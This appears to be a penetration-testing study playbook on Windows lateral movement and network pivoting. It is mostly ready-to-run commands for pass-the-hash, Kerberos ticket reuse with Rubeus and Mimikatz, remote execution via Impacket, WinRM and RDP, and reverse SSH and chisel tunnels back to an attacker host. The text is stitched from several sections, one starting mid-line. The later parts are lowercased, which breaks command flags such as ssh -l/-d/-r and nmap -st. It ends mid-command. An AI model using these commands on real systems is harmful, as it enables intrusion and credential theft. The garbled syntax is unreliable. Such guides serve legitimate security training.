# Lateral Movement [← Stage index](README.md) | [Identity transitions](03-kerberos-and-identity-transitions.md) | [Pivoting](../07-pivoting-tunneling/README.md) | [AD cheatsheet](../../cheatsheets/active-directory.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Move to another host](../../notes/methods/lateral-movement.md) > **Selection rule:** credential type → accepted authentication protocol → reachable service → service-specific authorization → execution/session effect. > > **Exit:** verify the destination hostname, represented identity, token/rights and network state; then re-enumerate credentials, domain relationships, sessions and routes. ## 1. Choose by credential and service | Material | Compatible starting paths | Important boundary | | --- | --- | --- | | Password | SMB/SCM, WMI/DCOM, WinRM/WinRS, RDP | Correct password does not grant the required logon or execution right | | NT hash | NTLM-capable SMB/WMI/WinRM; RDP only through Restricted Admin where supported | Net-NTLM and DCC2 are not reusable NT hashes | | TGT/ccache | Kerberos-capable tool using target FQDN/SPN | Ticket identity, realm, lifetime, DNS and KDC route must match | | TGS | Only the named `SERVICE/HOST` and compatible client | A CIFS ticket does not authorize WinRM, WMI or RDP | | AES/NT long-term key | Request a TGT, then use Kerberos | RC4/NT-key requests can fail where RC4 is disabled | | Local-account password/hash | NTLM or RDP in the target's local account context | Remote UAC/account restrictions commonly filter non-RID-500 local administrators | | Reachable service | Common execution/access mechanisms | Usual authorization | | --- | --- | --- | | SMB 445 + SCM/RPC | PsExec, SMBExec, service creation | Administrative share plus SCM/service rights | | RPC endpoint mapper 135 + dynamic RPC; often SMB for output | WMIExec, native CIM/WMI, DCOM | Remote WMI/DCOM rights, commonly an effective administrator token | | Task Scheduler RPC plus SMB output | ATExec | Remote task creation and administrative output access | | WinRM 5985/5986 | WinRS, PowerShell remoting, Evil-WinRM | Enabled endpoint and endpoint/session authorization | | RDP 3389 | FreeRDP, MSTSC | Remote-interactive logon right; Restricted Admin requires administrator access | ## 2. Preflight from the actual source Directly routed source: ```bash nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET -oN movement-preflight.txt getent hosts TARGET_HOST date -u ``` Windows source: ```powershell Resolve-DnsName TARGET_HOST Test-NetConnection TARGET_HOST -Port 445 Test-NetConnection TARGET_HOST -Port 5985 Test-NetConnection TARGET_HOST -Port 3389 w32tm /query /status ``` Port 135 alone does not prove WMI/DCOM viability because RPC commonly negotiates a dynamic high port. When the destination is reachable only through a pivot, perform these checks through the established Block 13 route and respect the client/proxy's transport limits. Record: ```text SOURCE POSITION -> TARGET FQDN/IP -> ROUTE -> SERVICE/PORT -> CREDENTIAL TYPE -> LOCAL/DOMAIN IDENTITY -> EXPECTED RIGHT -> CHOSEN METHOD -> EXPECTED EFFECT ``` ## 3. Validate authentication separately from execution NetExec can classify a selected SMB credential: ```bash # Domain password nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' # Domain NT hash nxc smb TARGET -d DOMAIN -u USER -H NT_HASH # Target-local account nxc smb TARGET -u Administrator -H NT_HASH --local-auth # Prove only share access nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares ``` > A successful login proves SMB authentication. `(Pwn3d!)` is NetExec's SMB administrative-context indicator, not proof that WinRM, RDP, WMI or every SMB execution method will succeed. For one justified execution proof: ```bash nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname & whoami" --exec-method wmiexec ``` Current NetExec can select `wmiexec`, `atexec` or `smbexec`; without an explicit method it may fail over between them. Use a forced method when diagnosing prerequisites so the result remains attributable. ## 4. SMB and service-control execution ### Impacket PsExec ```bash # Password impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET' # NT hash / Pass-the-Hash impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > **Need:** SMB 445/139, writable administrative share and Service Control Manager rights. Impacket uploads a RemCom service binary, creates/starts a service and communicates over named pipes. Verify the returned identity; the service context is commonly SYSTEM. Kerberos cache: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ``` The target parameter uses the hostname matching the CIFS/HOST SPN; `-target-ip` separates connection routing from Kerberos naming. ### Sysinternals PsExec from Windows ```cmd PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe ``` > The official PsExec binary is not built into Windows. It requires remote administrative access and creates the PSEXESVC service/artifacts. Avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable. ### SMBExec ```bash impacket-smbexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > SMBExec creates temporary services whose command lines redirect output through a share. It does not use the same uploaded RemCom binary as PsExec, but it still requires SCM/service rights and produces substantial service/event artifacts.
Kerberos and alternate output modes ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-smbexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' # SHARE is default; SERVER starts a local SMB server and needs permission to bind locally. impacket-smbexec -mode SHARE -share C$ 'DOMAIN/USER:PASSWORD@TARGET' ```
### ATExec ```bash impacket-atexec 'DOMAIN/USER:PASSWORD@TARGET_HOST' "cmd.exe /c hostname & whoami" impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ``` > ATExec creates and deletes a scheduled task and normally retrieves output from `ADMIN$\Temp`. It is a one-shot command mechanism, not an interactive shell; task-scheduler RPC and administrative share access must both work. Kerberos: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-atexec -k -no-pass -dc-ip DC_IP 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ``` ## 5. WMI and DCOM execution ### Impacket WMIExec ```bash impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > WMIExec creates processes through WMI/DCOM. Its normal output channel uses SMB and defaults to `ADMIN$`; therefore a WMI process may run even when output retrieval fails. `-nooutput` or `-silentcommand` changes that evidence channel. Kerberos with separate name and route: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ```
One command, no SMB output ```bash impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt" ``` Verify the harmless artifact through an independently authorized channel. No returned stdout is expected.
### Native PowerShell CIM over DCOM ```powershell $Credential = Get-Credential 'DOMAIN\USER' $Options = New-CimSessionOption -Protocol Dcom $Session = New-CimSession -ComputerName TARGET_HOST -Credential $Credential -SessionOption $Options Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'cmd.exe /c hostname > C:\Windows\Temp\movement-proof.txt' } Remove-CimSession $Session ``` > `ReturnValue = 0` and a process ID confirm process creation, not its final effect. WMI-created processes run in session 0; GUI programs will not appear on an interactive desktop. ### DCOM MMC method Current Windows token: ```powershell $Type = [type]::GetTypeFromProgID('MMC20.Application.1','TARGET_HOST') $Object = [Activator]::CreateInstance($Type) $Object.Document.ActiveView.ExecuteShellCommand( 'cmd.exe', $null, '/c hostname > C:\Windows\Temp\movement-proof.txt', '7' ) ``` Impacket with password or NT hash: ```bash impacket-dcomexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > Current Impacket `dcomexec` explicitly rejects Kerberos for its supported MMC/Shell DCOM objects because they do not accept the required HOST ticket. Use `wmiexec -k` when Kerberos command execution is required. DCOM class availability, RPC reachability and launch/access permissions vary. ## 6. WinRM, WinRS and PowerShell remoting ### Evil-WinRM ```bash # Password; omit -p to prompt where supported evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' # NT hash evil-winrm -i TARGET_HOST -u USER -H NT_HASH # HTTPS listener evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986 ``` Current Evil-WinRM ticket-file support: ```bash evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP ``` > **Need:** reachable 5985/5986, an enabled WinRM/PowerShell endpoint and endpoint authorization. The identity is commonly an administrator or a member of the applicable remote-management group, but endpoint SDDL/policy is decisive. Kerberos requires the FQDN/SPN, realm/KDC configuration and a compatible ticket. ### Native WinRS ```cmd winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" ``` To avoid retaining a password on the command line, use the current authorized Windows credential context where possible: ```cmd winrs /r:TARGET_HOST "cmd /c hostname & whoami" ``` > WinRS uses WinRM. A non-administrator can require `/noprofile` depending on endpoint configuration. `/allowdelegate` affects onward credential use and is not a default fix for the double-hop problem. ### PowerShell remoting ```powershell Test-WSMan TARGET_HOST $Credential = Get-Credential 'DOMAIN\USER' Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock { hostname whoami /all } $Session = New-PSSession -ComputerName TARGET_HOST -Credential $Credential Enter-PSSession -Session $Session ``` > A hostname normally supports Negotiate/Kerberos in a domain. An IP address requires explicit credentials and generally HTTPS or a tightly scoped TrustedHosts configuration. Do not weaken global TrustedHosts merely to hide DNS/SPN mistakes. ## 7. RDP Check the installed binary name: ```bash command -v xfreerdp3 || command -v xfreerdp ``` Password: ```bash xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard ``` Older packages may expose the same syntax through `xfreerdp`. NT hash: ```bash xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution ``` > FreeRDP's `/pth` uses Restricted Admin mode. The target must support/permit that mode and the identity must be an administrator; ordinary Remote Desktop Users membership is not sufficient for Restricted Admin. Password-based RDP instead needs the Remote Desktop service, NLA compatibility and the effective “Allow log on through Remote Desktop Services” right without a deny override. Native client: ```cmd mstsc.exe /v:TARGET_HOST mstsc.exe /restrictedAdmin /v:TARGET_HOST ``` Ordinary RDP can place reusable user credentials in the destination's LSASS. Restricted Admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately. ## 8. Pass-the-Hash, Overpass-the-Hash and Pass-the-Ticket ### Pass-the-Hash ```text NT HASH -> NTLM CHALLENGE/RESPONSE -> TARGET SERVICE ``` PtH requires an NTLM-capable service, a valid account context and the service-specific right. SMB share access may work without administrative execution; PsExec/WMIExec/SMBExec usually need administrative rights. Remote UAC commonly filters non-built-in local administrators. Domain accounts in the target Administrators group traditionally receive a full remote token, but newer Administrator Protection policy can change that result—trust the observed target token and method-specific authorization. ### Overpass-the-Hash / key-to-ticket Mimikatz network-credential context: ```text sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe ``` Rubeus TGT request: ```cmd Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt klist ``` AES alternative: ```cmd Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt ``` Trigger a Kerberos service request with the hostname, then inspect: ```cmd dir \\TARGET_HOST\C$ klist ``` > In a Mimikatz `sekurlsa::pth` process, `whoami` can still show the original local process token while network authentication uses the supplied identity. Validate the ticket's client and the remote result rather than treating local `whoami` as the network identity. ### Pass-the-Ticket Windows: ```cmd Rubeus.exe ptt /ticket:ticket.kirbi klist ``` ```text kerberos::ptt ticket.kirbi ``` Linux: ```bash export KRB5CCNAME="$PWD/ticket.ccache" klist impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ``` A TGS must name the selected service/hostname. A TGT can request a suitable TGS only while valid and when the KDC is reachable. Ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect. ## 9. Local versus domain identity and remote UAC ```text DOMAIN\USER -> domain identity; evaluate target-local group/right TARGET\USER -> SAM identity on that target ./USER -> tool-specific local-account selection ``` Common failure pattern: 1. a local account authenticates over SMB; 2. Windows issues a filtered remote token; 3. `ADMIN$`, SCM or WMI administrative operations fail. Do not “fix” this by changing `LocalAccountTokenFilterPolicy` during an attack workflow. Use a method already permitted by the target's configuration, the built-in Administrator where legitimately obtained and applicable, RDP if authorized, or another mapped identity. ## 10. Output channels, session 0 and double hop Remote process creation, stdout retrieval and an interactive shell are separate states: ```text AUTHENTICATED -> REMOTE OPERATION AUTHORIZED -> PROCESS/TASK/SERVICE CREATED -> COMMAND EFFECT OCCURRED -> OUTPUT RETURNED OR CALLBACK CONNECTED -> USABLE SESSION ``` - PsExec returns named-pipe I/O through its service. - WMIExec normally redirects output to an SMB share. - SMBExec redirects command output while repeatedly creating services. - ATExec writes output under `ADMIN$\Temp`. - Native WMI/DCOM may return only a PID/return value; verify a harmless file or another bounded effect. - WMI/DCOM/service processes commonly run in session 0, so a GUI is not visible to the logged-on user. - WinRM creates a remote shell/runspace and returns structured or text output. A WinRM/PowerShell session on HOST_A may not possess delegable credentials for HOST_B. That “double hop” is a credential-context problem, not proof that HOST_B or the password is wrong. Prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation. ## 11. Failure router | Evidence | Layer | Next decision | | --- | --- | --- | | Timeout/refused | Route, firewall or listener | Verify from the actual source and account for RPC dynamic ports | | SMB login succeeds; `ADMIN$` denied | Share/admin token/UAC | Distinguish share authentication from effective administrator context | | `(Pwn3d!)` but forced method fails | Method-specific SCM/WMI/task prerequisite | Test only that method's RPC/service right and side effects | | `STATUS_LOGON_FAILURE` | Credential/domain/authentication | Correct local/domain context, artifact type and protocol | | `STATUS_ACCOUNT_RESTRICTION` or logon-type denial | Account policy/right | Check permitted logon type and deny overrides | | RPC server unavailable | 135/dynamic RPC/firewall/service | Validate endpoint mapper and negotiated port from source | | WMI return value nonzero | Process creation request failed | Decode return value; command effect is unconfirmed | | Process succeeds; output missing | Output channel, share or session-0 behavior | Use a bounded file/side-effect proof or compatible output option | | WinRM listener responds; shell denied | Endpoint SDDL/group/logon/UAC policy | Validate endpoint authorization, not merely credentials | | RDP NLA succeeds; logon denied | Remote-interactive right or deny policy | Verify Remote Desktop Users/Administrators and user-right assignment | | RDP `/pth` denied | Restricted Admin disabled/unsupported or user not admin | Do not equate ordinary RDP authorization with Restricted Admin | | `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hostname/SPN/realm | Use FQDN matching the ticket and correct realm | | `KRB_AP_ERR_MODIFIED` | SPN account/key mismatch | Confirm SPN owner, target alias and ticket key | | Clock-skew error | Time | Repair time before credential changes | | Kerberos tool uses IP and falls back/fails | Name/SPN selection | Separate `TARGET_HOST` from `TARGET_IP` | | First hop works; second hop denied | Credential delegation/double hop | Move execution to credential-holding source or use an explicit ticket | ## 12. After movement ```cmd hostname whoami /all ipconfig /all route print netstat -ano klist ``` Re-enumerate: 1. local privilege and accessible credential sources; 2. domain groups, ACLs, shares and host rights under the new identity; 3. logged-on sessions and service accounts; 4. interfaces, routes, DNS, listeners and internal reachability; 5. the next evidence-backed host/identity transition. Do not overwrite the earlier state. Record the source host, credential form, authentication protocol, execution method, returned identity and side effects. ## Tooling for this section | Tool | Choose it for | Needs | Baseline | Decisive output | Failure cue | | --- | --- | --- | --- | --- | --- | | Nmap/Test-NetConnection | Service reachability | Actual source route | Section 2 | Reachable named service | Direct test bypasses/ignores the pivot | | NetExec | Selected credential/admin-context validation | Supported protocol and credential | Section 3 | Exact identity plus method-specific admin cue | Auth success without execution right | | Impacket PsExec | Interactive SMB/SCM execution | Admin share + SCM | Section 4 | Remote shell/verified identity | Share/service creation denied | | Impacket SMBExec | Command shell without RemCom upload | SCM + output route | Section 4 | Command output | Service/output share failure | | Impacket ATExec | One-shot scheduled task | Task RPC + ADMIN$ output | Section 4 | Retrieved command output | Task created but output unavailable | | Impacket WMIExec | WMI process creation with password/hash/ticket | RPC/DCOM; SMB unless no-output | Section 5 | Shell/output or verified effect | RPC works but share/output fails | | Impacket DCOMExec | NTLM password/hash DCOM objects | RPC/DCOM and supported object | Section 5 | Verified command effect | Kerberos deliberately unsupported | | Evil-WinRM | Interactive WinRM/PSRP | Endpoint authorization | Section 6 | Remote PowerShell prompt | Listener present but endpoint rejects | | WinRS/PowerShell remoting | Built-in Windows management | WinRM and token/credential | Section 6 | Remote hostname/identity | IP trust or double-hop issue | | FreeRDP/MSTSC | GUI/remote-interactive session | RDP right/NLA; admin for Restricted Admin | Section 7 | Usable desktop with verified identity | Auth accepted but logon type denied | | Rubeus/Mimikatz/klist | Key/ticket context | Correct key/ticket/logon session | Section 8 | Expected TGT/TGS client and service | Local token confused with network identity | Package names vary: current Kali-style Impacket commands commonly use the `impacket-` prefix, and FreeRDP 3 packages may expose `xfreerdp3` while older packages use `xfreerdp`. Inspect local `-h` output before use. ## winexe — Samba-side service execution alternative Use when the chosen account has working SMB authentication and effective remote service-control/administrative rights. This is a service-execution transport, not a credential bypass. ```bash # Prompts for the accepted identity's password winexe -U 'DOMAIN/USER' //TARGET 'cmd.exe /c whoami' ``` Read: verify the returned identity and destination. Access denied after a successful login points to authorization/UAC/service-control conditions; it does not justify guessing more passwords. Service creation and resulting artifacts require the same cleanup discipline as the other SMB execution methods. Prefer the existing supported Impacket/NetExec method when this legacy client is unavailable or incompatible. # conditional ad infrastructure and trust checks

[stage index](readme.md) | [complete task index](../index.md) | [object control and delegation](04-object-control-adcs-and-domain-compromise.md) | [lateral movement](05-lateral-movement.md)

use these checks when host or directory evidence identifies the feature. they identify the next prerequisite to investigate; they are not complete exploitation recipes for every product or version.

## dnsadmins: distinguish dns configuration from a service trigger

```powershell
# domain-joined source with the rsat ad module and readable group membership
get-adgroupmember -identity dnsadmins -recursive
```

```cmd
:: service queries use the current identity and can be denied separately
sc.exe \\dc_host qc dns
sc.exe \\dc_host sdshow dns
```

> **read → next:** resolve whether the controlled identity really has dns-server configuration rights, which server runs dns, its service identity, and whether a usable plugin/configuration operation and restart trigger exist on that build. group membership alone does not prove immediate execution or restart rights. follow the [service-control permission workflow](../05-local-privilege-escalation/02-windows-privilege-escalation.md#4-service-control-and-executed-objects). a dns restart on a dc can interrupt the domain; do not use it as a discovery probe.

## wsus: identify the update authority from the current client

```cmd
reg query hklm\software\policies\microsoft\windows\windowsupdate /v wuserver
reg query hklm\software\policies\microsoft\windows\windowsupdate /v wustatusserver
reg query hklm\software\policies\microsoft\windows\windowsupdate\au /v usewuserver
```

> **read → next:** record the actual server url, port, tls and client policy. a client configured for wsus does not grant update approval, content/signing control or server administration. investigate server access and the exact privileged update consumer only after those rights are established. missing registry values can mean another policy/configuration source; they do not prove the organization has no wsus.

## configuration manager / sccm: recognize the client before choosing a server-side path

```powershell
get-service ccmexec -erroraction silentlycontinue
get-ciminstance -namespace root\ccm -classname sms_client
```

> **read → next:** `ccmexec`/`sms_client` identifies a client context. it does not prove site-server access, sms provider authorization, deployment rights, accessible network-access-account credentials or permission to execute cmpivot. record the site/management point from readable client configuration and test only the matching authenticated interface. namespace absent and access denied are different outcomes. this reference does not yet contain a complete sccm compromise procedure.

## trusts: inspect the boundary before treating another domain as reachable privilege

```cmd
nltest /domain_trusts /all_trusts
```

```powershell
# rsat alternative; query the domain in the current authenticated context
get-adtrust -filter * -properties * |
    format-list name,direction,trusttype,foresttransitive,selectiveauthentication,sidfilteringforestaware,sidfilteringquarantined
```

> **read → next:** keep trust direction, same-forest versus cross-forest scope, sid filtering, selective authentication, target spn and the accepted identity separate. a trust object or child-domain admin does not by itself prove a usable forest-compromise chain. verify name resolution, service reachability and authorization in the destination using the [movement preflight](05-lateral-movement.md#2-preflight-from-the-actual-source). trust-key/sid-history forgery and cross-forest coercion are specialized paths, not complete procedures in this playbook.

dns/spn behavior and any callback route are independently verified. ## 1. draw the route before choosing a command ```text application tool -> local listener / socks endpoint / tun route -> tunnel transport endpoint -> pivot exit -> internal destination service callback target -> pivot listener or routable address -> relay/tunnel -> final listener ``` record: ```text tool_host -> entry_socket/route -> transport -> pivot -> destination application protocol | tcp/udp | initiator | bind address | dns point credential/spn name | callback route | privilege | cleanup objects ``` do not use “pivot works” as a single state. confirm these layers separately: 1. the tunnel process started; 2. its listener/transport connection exists; 3. the pivot can reach the intended destination socket; 4. the local route, forward or proxy points at the right exit; 5. the application actually uses that path; 6. name resolution and authentication match the application; 7. a callback, if required, has its own return path. ## 2. discover the pivot's network position linux: ```bash id ip -brief address ip route ip neigh ss -lntup cat /etc/resolv.conf ``` windows: ```cmd whoami /all ipconfig /all route print arp -a netstat -ano ``` powershell selected endpoints: ```powershell get-netipconfiguration get-netroute -addressfamily ipv4 | sort-object destinationprefix,routemetric get-nettcpconnection -state listen get-dnsclientserveraddress -addressfamily ipv4 ``` > an interface or route proves a possible network position, not destination reachability. validate one justified socket from the pivot before building a tunnel. ```bash nc -nvz -w 3 internal_host internal_port curl -v --connect-timeout 5 http://internal_host:internal_port/ ``` ```powershell test-netconnection internal_host -port internal_port ``` ## 3. choose the smallest compatible route | need | baseline | choose when | main limitation | | --- | --- | --- | --- | | one tcp service through an ssh pivot | ssh local forward | kali can initiate ssh to pivot | one destination socket per forward | | many tcp destinations through ssh pivot | ssh dynamic forward | kali can initiate ssh to pivot | socks/client compatibility | | pivot can connect outward but inbound access is blocked | ssh remote or remote-dynamic forward | pivot has openssh client and can reach kali ssh | kali ssh policy; openssh version for remote dynamic | | ssh hop directly to internal ssh | `proxyjump` | both pivot and destination provide ssh | ssh-only path | | simple linux tcp relay | socat | binary already exists and listener can be exposed | clear tcp relay; no authentication/encryption | | transparent selected subnets through ssh | sshuttle | suitable ssh server with python; local privileges | tcp/dns-oriented, local firewall changes | | windows ssh-based forward | built-in `ssh.exe` or plink | compatible client exists and outbound ssh works | server policy and credential/host-key handling | | windows native fixed tcp relay | `netsh interface portproxy` | elevated token; target modification acceptable | tcp only; firewall/ip helper/stateful cleanup | | outbound http/websocket-shaped tunnel | chisel | pivot can run matching binary and reach server | client/server compatibility and proxy/client transport limits | | routed access for ordinary clients | ligolo-ng | agent can reach proxy and tun/route setup is possible | userland stack is not identical to direct raw networking | | dns is the only viable egress | dnscat2 | dns path plus authoritative/direct server control | slow/noisy, infrastructure and client required | prefer one explicit forward for one known service. use socks when several tcp endpoints must be explored. use a routed pivot when many ordinary tools must operate without proxy wrappers. do not add a multi-host route when command execution directly on the pivot is sufficient. ## 4. socat fixed tcp relay on a linux pivot, expose one internal tcp service: ```bash socat -ddd tcp-listen:local_port,bind=pivot_reachable_ip,reuseaddr,fork \ tcp:internal_host:internal_port ``` loopback-only relay for another local tunnel stage: ```bash socat -ddd tcp-listen:local_port,bind=127.0.0.1,reuseaddr,fork \ tcp:internal_host:internal_port ``` verify the listener on the pivot with `ss -lntp | grep local_port`. run `nc -nvz pivot_reachable_ip local_port` from the intended client to test client-to-pivot reachability. these checks run on different machines: ```bash ss -lntp | grep local_port nc -nvz pivot_reachable_ip local_port ``` > `fork` handles multiple connections. `reuseaddr` eases rebinding after restart. socat does not add authentication or encryption to this relay; bind narrowly and remove the process when finished. a listener can exist even when the pivot-to-destination connection fails. ## 5. openssh forwarding add reliability and attributable failure to transport-only sessions: ```text -n -o exitonforwardfailure=yes -o serveraliveinterval=30 -o serveralivecountmax=3 ``` `exitonforwardfailure` proves requested listening sockets were established. it does not prove the final destination is reachable through them. ### 5.1 local forward: listener on the ssh client run on kali when kali can ssh to the pivot: ```bash ssh -n \ -l 127.0.0.1:local_port:internal_host:internal_port \ -p ssh_port user@pivot \ -o exitonforwardfailure=yes \ -o serveraliveinterval=30 -o serveralivecountmax=3 ``` use the listener as though it were the internal service: ```bash nc -nvz 127.0.0.1 local_port curl -v http://127.0.0.1:local_port/ ``` > the ssh server/pivot resolves and connects to `internal_host`. bind to `127.0.0.1` unless another authorized local host must use the forward; `-g` or a non-loopback bind expands exposure. ### 5.2 dynamic forward: socks listener on the ssh client ```bash ssh -n -d 127.0.0.1:1080 -p ssh_port user@pivot \ -o exitonforwardfailure=yes \ -o serveraliveinterval=30 -o serveralivecountmax=3 ``` openssh acts as a socks4/5 server. the pivot makes destination connections selected by each socks request. ### 5.3 remote forward: listener on the ssh server run on a pivot that can initiate an ssh connection back to kali: ```bash ssh -n \ -r 127.0.0.1:kali_port:internal_host:internal_port \ -p kali_ssh_port kali_user@lhost \ -o exitonforwardfailure=yes \ -o serveraliveinterval=30 -o serveralivecountmax=3 ``` kali then uses: ```bash nc -nvz 127.0.0.1 kali_port ``` > the ssh client/pivot connects to `internal_host`. `allowtcpforwarding` and server policy must permit the forward. a non-loopback remote bind additionally depends on `gatewayports`; do not assume `0.0.0.0` was honored. ### 5.4 remote dynamic forward: socks listener on the ssh server run on the pivot: ```bash ssh -n -r 127.0.0.1:1080 -p kali_ssh_port kali_user@lhost \ -o exitonforwardfailure=yes \ -o serveraliveinterval=30 -o serveralivecountmax=3 ``` the socks listener appears on kali and destination connections exit through the pivot. remote dynamic forwarding requires openssh 7.6 or later on the client that issues `-r`. run `ssh -v` on the pivot (the ssh client). run `ss -lntp | grep 1080` on kali (the ssh server hosting the socks listener). these checks run on different machines; do not paste both into one terminal: ```bash ssh -v ss -lntp | grep 1080 ``` ### 5.5 ssh jump and proxy command direct ssh through an ssh pivot: ```bash ssh -j pivot_user@pivot target_user@internal_host ``` ssh through an existing socks5 endpoint with ncat: ```bash ssh -o proxycommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \ target_user@internal_host ``` `%h` and `%p` are replaced with the destination host and port. prefer this native proxy route when proxychains interposition is unreliable.
use an ssh configuration for repeated access ```sshconfig host pivot hostname pivot user pivot_user host internal hostname internal_host user target_user proxyjump pivot ``` ```bash ssh internal scp file internal:destination_path ```
## 6. proxychains and socks-aware clients use a task-specific configuration rather than repeatedly editing a shared global file: ```text strict_chain proxy_dns tcp_read_time_out 15000 tcp_connect_time_out 8000 [proxylist] socks5 127.0.0.1 1080 ``` ```bash proxychains4 -q -f ./proxychains-pivot.conf curl http://internal_host:port/ proxychains4 -q -f ./proxychains-pivot.conf nmap -st -pn -n -p ports internal_host proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \ 'domain/user:password@internal_host' ``` constraints: - proxychains hooks socket calls in dynamically linked programs; some static binaries, scripts, child processes or dynamically loaded modules bypass or break the hook. - proxychains supports tcp only. it does not proxy udp, icmp, syn scans or pcap-based discovery. - for nmap use `-st -pn -n` with a focused port list. proxy scanning is slow and is not a replacement for discovery from the pivot. - `proxy_dns` moves supported hostname resolution through the proxy, but application behavior varies. `-n` prevents nmap's local reverse lookups. - prefer an application's native proxy option when available. native examples: ```bash curl --socks5-hostname 127.0.0.1:1080 http://internal_host:port/ ncat --proxy-type socks5 --proxy 127.0.0.1:1080 internal_host internal_port ``` ## 7. sshuttle transparent selected-subnet route ```bash sudo sshuttle --dns \ -r ssh_user@pivot:ssh_port \ internal_subnet another_subnet ``` through a previously established local forward to the ssh pivot: ```bash sudo sshuttle --dns \ -r ssh_user@127.0.0.1:local_ssh_port \ internal_subnet ``` > sshuttle is useful when many tcp clients need transparent access. it requires privileges and firewall/redirection support on the client; the remote side needs a compatible python execution path. it is not a general layer-2 vpn and does not make arbitrary raw-packet or udp behavior equivalent to direct routing. record the selected subnets so existing vpn routes are not accidentally captured. ## 8. windows forwarding alternatives ### 8.1 built-in openssh client ```cmd where ssh.exe ssh.exe -v ssh.exe -n -r 127.0.0.1:1080 kali_user@lhost -p kali_ssh_port -o exitonforwardfailure=yes -o serveraliveinterval=30 ``` the same `-l`, `-d`, `-r`, `proxyjump` and `proxycommand` concepts apply to current windows openssh. remote dynamic forwarding depends on the client version. ### 8.2 plink remote fixed forward from windows to kali: ```cmd plink.exe -ssh -n -batch -hostkey "host_key_fingerprint" ^ -l kali_user -pwfile c:\path\kali-password.txt ^ -r 127.0.0.1:kali_port:internal_host:internal_port ^ -p kali_ssh_port lhost ``` local dynamic socks on windows: ```cmd plink.exe -ssh -n -batch -hostkey "host_key_fingerprint" ^ -l ssh_user -pwfile c:\path\ssh-password.txt ^ -d 127.0.0.1:1080 -p ssh_port pivot ``` > current plink supports `-l`, `-r` and `-d`, but not openssh's remote-dynamic shorthand. `-batch` prevents an unseen prompt from hanging; pair it with a verified `-hostkey`. `-pwfile` avoids a literal password in the command line but creates a sensitive file that must be protected and removed. prefer a key or existing authenticated context where feasible. ### 8.3 netsh portproxy elevated windows shell: ```cmd netsh interface portproxy add v4tov4 ^ listenaddress=pivot_reachable_ip listenport=local_port ^ connectaddress=internal_host connectport=internal_port netsh interface portproxy show all netstat -ano -p tcp | findstr ":local_port" ``` if the existing firewall policy does not already allow the listener and a change is authorized: ```cmd netsh advfirewall firewall add rule name="oscp pivot local_port" ^ dir=in action=allow protocol=tcp localport=local_port ``` cleanup: ```cmd netsh interface portproxy delete v4tov4 ^ listenaddress=pivot_reachable_ip listenport=local_port netsh advfirewall firewall delete rule name="oscp pivot local_port" ``` > `portproxy` requires an elevated token, forwards tcp rather than udp, modifies persistent host configuration and may depend on the ip helper service. a stored rule or listening socket still does not prove the destination is reachable. record and remove both the proxy and any firewall rule. ## 9. chisel http/websocket tunnel ### 9.1 reverse socks: pivot initiates outward on kali: ```bash chisel server --reverse --port chisel_port ``` record the server fingerprint. on the pivot: ```bash chisel client --fingerprint 'server_fingerprint' \ lhost:chisel_port r:127.0.0.1:1080:socks ``` `r:socks` is the shorter equivalent using the default server-side `127.0.0.1:1080` listener. traffic sent to kali's socks listener exits through the chisel client/pivot. ### 9.2 reverse fixed tcp forward ```bash # kali chisel server --reverse --port chisel_port # pivot: expose an internal service on kali loopback chisel client --fingerprint 'server_fingerprint' lhost:chisel_port \ 